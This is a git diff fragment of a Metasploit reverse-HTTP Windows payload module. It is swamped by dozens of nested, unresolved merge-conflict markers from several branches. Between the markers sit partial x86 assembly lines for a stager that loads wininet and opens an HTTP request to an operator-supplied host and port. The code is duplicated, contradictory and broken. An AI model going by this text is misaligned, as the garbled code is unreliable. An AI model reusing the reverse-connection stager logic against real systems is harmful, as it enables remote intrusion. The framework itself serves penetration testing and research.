+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -1304,18 +1686,30 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
       ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
       ;-----------------------------------------------------------------------------;
@@ -1326,13 +1720,21 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -1344,10 +1746,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
@@ -1358,9 +1763,18 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -1373,16 +1787,23 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1420,9 +1841,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -1430,11 +1853,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
       ^
 
@@ -1473,6 +1909,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> pod/complex-payloads
@@ -1506,11 +1943,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1523,6 +1967,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -1530,18 +1975,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
@@ -1551,11 +2007,16 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1566,6 +2027,11 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
       server_uri:              ;  server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
@@ -1576,6 +2042,9 @@ module Payload::Windows::ReverseHttp
       httpopenrequest:
                                ; dwContext (NULL) [8]
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -1587,9 +2056,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
+=======
 =======
 =======
 >>>>>>> rapid7/master
@@ -1597,11 +2068,24 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
       server_uri:              ; server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
@@ -1652,6 +2136,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
       server_uri:              ;  server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
@@ -1668,11 +2153,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1685,6 +2177,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -1692,24 +2185,36 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1724,11 +2229,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1750,10 +2261,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
         push esi               ; hConnection
 >>>>>>> rapid7/master
@@ -1769,14 +2283,27 @@ module Payload::Windows::ReverseHttp
 =======
         push esi               ; hConnection
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
         push eax               ; hConnection
 >>>>>>> pod/complex-payloads
+=======
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+=======
+        push esi               ; hConnection
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1826,6 +2353,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
       send_request:
       ^
 
@@ -1851,6 +2388,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 =======
@@ -1859,11 +2397,16 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 =======
+>>>>>>> pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
@@ -1872,16 +2415,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+<<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
@@ -1891,11 +2447,14 @@ module Payload::Windows::ReverseHttp
     ^
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 
     if opts[:ssl]
       asm << %Q^
@@ -1913,17 +2472,25 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> 4.11.2_release_pre-rails4
 =======
 <<<<<<< HEAD
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1936,6 +2503,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -1943,18 +2511,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     end
 
     asm << %Q^
@@ -1974,6 +2553,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2054,6 +2634,10 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2063,6 +2647,10 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 =======
 >>>>>>> pod/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
       ^
 
       if opts[:exitfunk]
@@ -2126,6 +2714,9 @@ module Payload::Windows::ReverseHttp
         asm << asm_exitfunk(opts)
       end
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 =======
 >>>>>>> rapid7/master
@@ -2136,18 +2727,30 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     ^
 
     if opts[:exitfunk]
@@ -2162,11 +2765,14 @@ module Payload::Windows::ReverseHttp
       call ebp
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
       ^
     end
 
@@ -2218,6 +2824,7 @@ module Payload::Windows::ReverseHttp
       asm << asm_exitfunk(opts)
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -2277,11 +2884,18 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
@@ -2293,6 +2907,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -2300,18 +2915,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> msf-complex-payloads
 =======
 =======
->>>>>>> rapid7/master
-=======
->>>>>>> master
-=======
->>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
     asm
   end
 
@@ -2335,6 +2961,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> feature/complex-payloads
@@ -2345,11 +2972,17 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+<<<<<<< HEAD
+>>>>>>> pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> payload-generator.rb
+=======
+>>>>>>> pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 
@@ -2365,10 +2998,13 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 =======
 >>>>>>> msf-complex-payloads
 =======
+=======
+>>>>>>> pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
@@ -2379,10 +3015,19 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
 
 >>>>>>> pod/complex-payloads
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> pod/metasploit-gemfile-
 end
 
 end
